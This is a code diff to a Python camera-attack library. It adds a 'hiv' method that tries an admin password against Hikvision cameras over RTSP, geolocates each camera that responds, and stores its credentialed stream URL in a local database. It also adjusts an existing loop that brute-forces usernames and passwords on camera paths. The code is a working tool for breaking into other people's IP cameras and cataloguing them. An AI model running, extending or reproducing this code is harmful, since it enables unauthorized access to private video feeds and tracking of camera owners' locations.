@@ -456,6 +456,29 @@ class CamLib():
             if ver:
                 log.info(f"Results successfully appended to: [\033[33m{path_file}\033[0m]")
 
+    def hiv(self,ip:str,port=554,password=''):
+            def extract_ip(rtsp):
+                match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
+                return match.group(1) if match else None
+            data = self.get_LocalDB_data(self.LOCAL_DB)
+            if not data:
+                data = []
+            ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
+            if ip in ip_set:
+                log.warning(f"[{ip}] This IP has already been recorded...",ip)
+                return 0
+            path = self.PATH[0]
+            auth_bloodcat = self.b64('admin', password)
+            resp = self.describe_path(ip, port, path, auth_bloodcat)
+            code = self.status(resp)
+            if code in (200, 403):
+                ip_data = self.show_location(ip)
+                rtsp_url = f"rtsp://admin:{password}@{ip}:{port}{path}"
+                log.success(f"Hikvision RTSP PLAY ：[\033[5m{rtsp_url}]",rtsp_url)
+                self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
+            else:
+                log.warning(f"Hikvision camera unreachable (likely firewall-blocked, verify via web service): [admin:{password}@{ip}:{port}]")
+    
     def run(self, ip: str, port=554,password=''):
         def extract_ip(rtsp):
             match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
@@ -512,9 +535,9 @@ class CamLib():
             self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
             return 1
         if not paths_with_401:
-            paths_with_401 = ["/"]  
+            paths_with_401 = self.PATH[0]
         valid_creds = []
-        target_path = paths_with_401[0]
+        target_path = paths_with_401
         log.info(f"witching to path: [{target_path}], attempting to retrieve credentials...", f"{target_path}")
         for u in self.USER:
             for p in self.PASSWORD:
